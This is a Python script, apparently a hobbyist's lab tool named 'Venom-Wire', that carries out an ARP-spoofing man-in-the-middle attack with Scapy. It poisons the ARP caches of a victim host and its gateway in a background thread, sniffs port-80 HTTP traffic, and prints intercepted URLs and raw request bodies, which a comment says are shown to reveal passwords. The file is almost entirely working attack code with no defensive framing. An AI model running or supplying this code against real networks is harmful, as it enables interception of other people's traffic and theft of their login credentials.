from scapy.all import *
from scapy.layers.http import HTTPRequest # Import HTTP layer
import time
import sys
import threading # <--- NEW: Allows multitasking

# CONFIGURATION
VICTIM_IP = "10.10.0.10"
GATEWAY_IP = "10.10.0.1"
INTERFACE = "eth0" 

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc if answered_list else None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac: return
    # The fixed layer 2 packet
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

# --- NEW: THE SNIFFER FUNCTION ---
def process_packet(packet):
    if packet.haslayer(HTTPRequest):
        # Extract the URL being visited
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        method = packet[HTTPRequest].Method.decode()
        print(f"\n[+] INTERCEPTED: {method} request to >> {url}")
        
        # If there is a password (Raw login data), show it
        if packet.haslayer(Raw):
            load = packet[Raw].load.decode(errors='ignore')
            print(f"    [DATA]: {load}")

def send_poison_loop():
    while True:
        spoof(VICTIM_IP, GATEWAY_IP)
        spoof(GATEWAY_IP, VICTIM_IP)
        time.sleep(2)

# --- EXECUTION ---
print(f"[*] Venom-Wire Active. Intercepting {VICTIM_IP}...")

try:
    # 1. Start the ARP Spoofer in a background thread
    t = threading.Thread(target=send_poison_loop, daemon=True)
    t.start()
    
    # 2. Start Sniffing in the main thread
    # filter="port 80" means we only care about web traffic (HTTP)
    sniff(iface=INTERFACE, filter="port 80", prn=process_packet, store=False)

except KeyboardInterrupt:
    print("\n[-] Stopping... Restoring Network...")
    restore(VICTIM_IP, GATEWAY_IP)
    restore(GATEWAY_IP, VICTIM_IP)